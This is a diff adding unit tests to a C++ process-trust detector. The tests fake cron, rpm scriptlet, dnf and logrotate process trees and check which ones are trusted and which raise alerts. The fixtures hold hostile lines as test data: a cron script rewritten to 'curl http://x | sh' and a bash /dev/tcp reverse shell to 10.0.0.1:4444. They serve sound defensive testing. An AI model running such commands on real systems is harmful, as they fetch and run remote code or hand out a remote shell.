@@ -7,6 +7,7 @@
 #include <filesystem>
 #include <fstream>
 #include <iostream>
+#include <map>
 #include <thread>
 #include <sys/stat.h>
 #include <unistd.h>
@@ -22,8 +23,11 @@ static void check(bool c, const std::string& m) {
 
 static int rpmMode = 0;
 static std::string rpmRootSeen;
-static std::string fakeRpm(const std::string& root, const std::string&) {
+static std::map<std::string, std::string> rpmFiles;
+static std::string fakeRpm(const std::string& root, const std::string& path) {
   if (root != "/") rpmRootSeen = root;
+  auto it = rpmFiles.find(path);
+  if (it != rpmFiles.end()) return it->second;
   if (rpmMode == 1) return std::string(64, 'a');
   return {};
 }
@@ -224,6 +228,119 @@ int main() {
   check(assessActor(7030).trust == ActorTrust::Untrusted, "plain user process is not trusted");
 
   setShownPathForTests("", "");
+
+  fakeProc(1, 0, 0, "systemd", sys, {"/usr/lib/systemd/systemd"});
+  for (const auto& d : {"/etc/cron.hourly", "/tmp"}) fs::create_directories(T + d);
+  for (const auto& d : {T + "/etc", T + "/etc/cron.hourly"}) mode755(d);
+  for (const auto& d : {T + "/var/tmp", T + "/tmp"}) fs::permissions(d, fs::perms::all | fs::perms::sticky_bit);
+  auto script = [&](const std::string& inner, const std::string& body, fs::perms extra = fs::perms::none) {
+    std::ofstream(T + inner) << body;
+    fs::permissions(T + inner, fs::perms::owner_read | fs::perms::owner_write | extra);
+    return sha256File(T + inner);
+  };
+  const fs::perms rx = fs::perms::owner_exec | fs::perms::group_read | fs::perms::group_exec |
+                       fs::perms::others_read | fs::perms::others_exec;
+  put(sys, "/usr/bin/crond");
+  put(sys, "/usr/bin/dnf5");
+  put(sys, "/usr/bin/sed");
+  put(sys, "/usr/bin/logrotate");
+  script("/usr/bin/run-parts", "#!/bin/bash\nfor i in $1/*; do $i; done\n", rx);
+  rpmFiles["/etc/cron.hourly/0anacron"] = script("/etc/cron.hourly/0anacron", "#!/bin/sh\nanacron -s\n", rx);
+  auto run = [&](int pid, int ppid, const std::string& comm, const std::string& exe,
+                 const std::vector<std::string>& argv, int uid = 0) {
+    fakeProc(pid, ppid, uid, comm, T + exe, argv, T, T + "/");
+  };
+  auto trusted = [&](int pid, const std::string& m) {
+    ActorVerdict a = assessActor(pid);
+    check(a.trust == ActorTrust::Trusted, m + ": " + a.summary());
+    check(decideProcess(a, false, true) == ProcessAction::Ignore, m + " is not reported");
+    check(!mayKill(a), m + " is never killed");
+  };
+  auto alerts = [&](int pid, const std::string& m) {
+    ActorVerdict a = assessActor(pid);
+    check(a.trust != ActorTrust::Trusted, m + ": " + a.summary());
+    check(decideProcess(a, false, false) == ProcessAction::AlertOnly, m + " is reported");
+  };
+
+  run(8001, 1, "crond", "/usr/bin/crond", {"/usr/sbin/crond", "-n"});
+  run(8002, 8001, "run-parts", "/usr/bin/bash", {"/bin/bash", "/usr/bin/run-parts", "/etc/cron.hourly"});
+  run(8003, 8002, "0anacron", "/usr/bin/bash", {"/bin/sh", "/etc/cron.hourly/0anacron"});
+  trusted(8003, "packaged cron script under run-parts");
+  run(8004, 8003, "anacron", "/usr/bin/cp", {"anacron", "-s"});
+  trusted(8004, "program started by a packaged cron script");
+  script("/etc/cron.hourly/0anacron", "#!/bin/sh\ncurl http://x | sh\n", rx);
+  alerts(8003, "modified packaged cron script");
+  alerts(8004, "child of a modified cron script");
+  script("/etc/cron.hourly/0evil", "#!/bin/sh\nid\n", rx);
+  run(8005, 8002, "0evil", "/usr/bin/bash", {"/bin/sh", "/etc/cron.hourly/0evil"});
+  alerts(8005, "cron script that no package owns");
+  rpmFiles["/etc/cron.hourly/0evil"] = script("/etc/cron.hourly/0evil", "#!/bin/sh\nid\n", rx);
+  fs::permissions(T + "/etc/cron.hourly", fs::perms::group_write, fs::perm_options::add);
+  alerts(8005, "packaged script in a group writable cron folder");
+  fs::permissions(T + "/etc/cron.hourly", fs::perms::group_write, fs::perm_options::remove);
+  trusted(8005, "same packaged script once the folder is locked");
+  script("/tmp/x.sh", "#!/bin/sh\nid\n", rx);
+  rpmFiles["/tmp/x.sh"] = sha256File(T + "/tmp/x.sh");
+  run(8006, 8001, "x.sh", "/usr/bin/bash", {"/bin/sh", "/tmp/x.sh"});
+  alerts(8006, "root script in /tmp");
+  script("/home/liveuser/Downloads.sh", "#!/bin/sh\nid\n", rx);
+  run(8007, 8001, "Downloads.sh", "/usr/bin/bash", {"/bin/sh", "/home/liveuser/Downloads.sh"});
+  alerts(8007, "root script in a home folder");
+
+  run(8010, 1, "dnf5", "/usr/bin/dnf5", {"dnf5", "upgrade", "-y"});
+  script("/var/tmp/rpm-tmp.Ab12Cd", "/sbin/ldconfig\nsed -i s/a/b/ /etc/crontab\n");
+  run(8011, 8010, "sh", "/usr/bin/bash", {"/bin/sh", "/var/tmp/rpm-tmp.Ab12Cd", "1"});
+  run(8012, 8011, "sed", "/usr/bin/sed", {"sed", "-i", "s/a/b/", "/etc/crontab"});
+  trusted(8011, "rpm scriptlet shell");
+  trusted(8012, "sed run by an rpm scriptlet");
+  fs::permissions(T + "/var/tmp/rpm-tmp.Ab12Cd", fs::perms::others_write, fs::perm_options::add);
+  alerts(8012, "scriptlet file that others can write");
+  fs::permissions(T + "/var/tmp/rpm-tmp.Ab12Cd", fs::perms::others_write, fs::perm_options::remove);
+  fs::permissions(T + "/var/tmp", fs::perms::sticky_bit, fs::perm_options::remove);
+  alerts(8012, "scriptlet in a shared folder without the sticky bit");
+  fs::permissions(T + "/var/tmp", fs::perms::sticky_bit, fs::perm_options::add);
+  run(8013, 6999, "sh", "/usr/bin/bash", {"/bin/sh", "/var/tmp/rpm-tmp.Ab12Cd", "1"});
+  run(8014, 8013, "sed", "/usr/bin/sed", {"sed", "-i", "s/a/b/", "/etc/crontab"});
+  alerts(8014, "scriptlet name started from a user session");
+
+  put(sys, "/usr/bin/dnf5 (deleted)");
+  fakeProc(8020, 1, 0, "dnf5", T + "/usr/bin/dnf5 (deleted)", {"dnf5", "upgrade", "-y"}, T, T + "/");
+  run(8021, 8020, "sh", "/usr/bin/bash", {"/bin/sh", "/var/tmp/rpm-tmp.Ab12Cd", "1"});
+  run(8022, 8021, "sed", "/usr/bin/sed", {"sed", "-i", "s/a/b/", "/etc/crontab"});
+  trusted(8020, "package manager whose program file was replaced by the update");
+  trusted(8022, "sed under a package manager replaced mid update");
+  put(sys, "/usr/bin/gone (deleted)");
+  fakeProc(8023, 1, 0, "gone", T + "/usr/bin/gone (deleted)", {"gone"}, T, T + "/");
+  run(8024, 8023, "sed", "/usr/bin/sed", {"sed", "-n", "p", "/etc/crontab"});
+  alerts(8024, "deleted program with nothing in its place");
+  fs::copy_file(sys, T + "/home/liveuser/dropper (deleted)");
+  mode755(T + "/home/liveuser/dropper (deleted)");
+  fakeProc(8025, 1, 0, "dropper", T + "/home/liveuser/dropper (deleted)", {"dropper"}, T, T + "/");
+  alerts(8025, "deleted program from a home folder");
+  fs::permissions(T + "/usr/bin/dnf5 (deleted)", fs::perms::others_write, fs::perm_options::add);
+  alerts(8022, "deleted program that others could write");
+  fs::permissions(T + "/usr/bin/dnf5 (deleted)", fs::perms::others_write, fs::perm_options::remove);
+
+  run(8030, 1, "logrotate", "/usr/bin/logrotate", {"/usr/sbin/logrotate", "/etc/logrotate.conf"});
+  run(8031, 8030, "sh", "/usr/bin/bash", {"sh", "-c", "\n /usr/bin/sed -i s/a/b/ /etc/crontab\n", "logrotate_script"});
+  run(8032, 8031, "sed", "/usr/bin/sed", {"/usr/bin/sed", "-i", "s/a/b/", "/etc/crontab"});
+  trusted(8032, "tool run by a postrotate sh -c");
+  alerts(8031, "the sh -c itself is still judged on its own code");
+  run(8033, 8030, "bash", "/usr/bin/bash", {"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"});
+  alerts(8033, "reverse shell under a trusted service");
+  check(strong({"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, "/usr/bin/bash"), "reverse shell pattern");
+  run(8034, 6999, "sh", "/usr/bin/bash", {"sh", "-c", "sed -i x /etc/crontab"});
+  run(8035, 8034, "sed", "/usr/bin/sed", {"sed", "-i", "x", "/etc/crontab"});
+  alerts(8035, "sh -c started by a user process");
+  run(8036, 8030, "bash", "/usr/bin/bash", {"bash", "-s"});
+  run(8037, 8036, "sed", "/usr/bin/sed", {"sed", "-i", "x", "/etc/crontab"});
+  alerts(8037, "child of a shell reading stdin");
+  run(8038, 8030, "python3", "/usr/bin/python3", {"python3", "-c", "import os"});
+  run(8039, 8038, "sed", "/usr/bin/sed", {"sed", "-n", "p"});
+  trusted(8039, "tool run by python -c from a trusted service");
+  alerts(8038, "python -c itself");
+  rpmFiles.clear();
+
   setExtraTrustedOwnerForTests(0);
   setProcRoot("");
   setRpmDigestFn(nullptr);
